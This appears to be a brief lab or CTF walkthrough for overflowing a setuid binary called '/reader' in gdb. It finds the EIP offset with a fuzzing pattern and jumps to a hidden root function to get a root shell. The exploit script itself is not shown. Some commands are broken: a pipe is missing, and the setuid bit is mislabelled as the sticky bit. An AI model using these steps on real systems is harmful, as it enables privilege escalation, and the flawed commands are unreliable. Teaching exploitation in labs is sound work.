Objective:

Find the hidden function which has root privileges and
exploit it.

Solution:

1. $ gdb -q /reader

Disassemble and check main func

2. gdb> pdisas main
Check what functions you have

3. gdb> info functions

Check functions one by one, notice what might be interesting.
When you find the function that you want to exploit, check its
return address, this address is what you need.

Create uniq and long fuzzing string
4. gdb> pattern_create 2000 fuzz.txt

Define how long string should be not to overwrite EIP register.
This will be our buffer.

5. gdb> pattern_offset hex_eip_adress

6. Build the exlploit and run it.

python exploit.py | tee shell.txt

gdb> run < shell.txt

Once we feed data to the binary’s stdin using the input redirector “<”, thedata is fed there and then stdin is closed. We need a way to hold it opene

7. (cat shell.txt; cat) ./reader

Make sure reader binary has sticky bit set.

$ chmod 4755 ./reader

this should give you the root shell.
